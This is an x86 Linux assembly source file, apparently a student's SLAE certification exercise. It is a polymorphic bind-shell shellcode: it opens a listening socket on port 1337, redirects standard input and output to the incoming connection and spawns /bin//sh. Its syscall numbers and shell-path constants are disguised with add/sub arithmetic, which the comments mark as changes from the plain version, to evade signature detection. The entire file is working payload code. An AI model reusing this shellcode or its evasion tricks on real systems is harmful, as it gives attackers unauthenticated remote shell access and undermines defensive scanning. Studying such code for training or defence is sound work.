;
;This code has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
;  	
;http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  
;
;Student ID: SLAE-1537
;

global _start			

section .text
_start:

	
	;instead of push byte 0x66 SYSCALL for socketcall
	push byte 0x7f
	pop eax
	sub eax, 0x19
	

	; modified this part a liitle bit
	;xor esi,esi
	;push esi

	; SYSCALL for socket
	push byte 0x1
	pop ebx
	xor esi,esi

	; push parameter
	push esi
	push ebx
	push byte +0x2
	mov ecx,esp
	int 0x80

	; poped 0x2
	pop edi

	; save the return value into edi, and 0x2 in eax
	xchg eax,edi
	; save 0x2(SYSCALL fo bind) in ebx, and 0x1 in eax
	xchg eax,ebx


	; instead of mov al,0x66
	mov al,0x7 
	add eax, 0x5f

	; push parameters
	push esi
	push word 0x3905
	push bx
	mov ecx,esp
	push byte 0x10
	push ecx
	push edi
	mov ecx,esp
	int 0x80

	
	;instead of mov al,0x66
	mov al,0x2c
	add eax, 0x3a

	;SYSCALL for listen
	mov bl,0x4
	push esi
	push edi
	mov ecx,esp
	int 0x80

	;instead of mov al,0x66
	mov al,0x95
	sub eax, 0x2f

	inc ebx
	push esi
	push esi
	push edi
	mov ecx,esp
	int 0x80
	pop ecx
	pop ecx
	mov cl,0x2
	xchg eax,ebx

loop:
	mov al,0x3f
	int 0x80
	dec ecx
	jns loop
	mov al,0xb
	;instead of push dword 0x68732f2f
	push dword 0x98BB5CCE
	sub dword [esp], 0x30482d9f 

	;instead of push dword 0x6e69622f
	push dword 0x45208B05
	add dword [esp], 0x2948d72a 

	mov ebx,esp
	inc ecx
	mov edx,ecx
	int 0x80










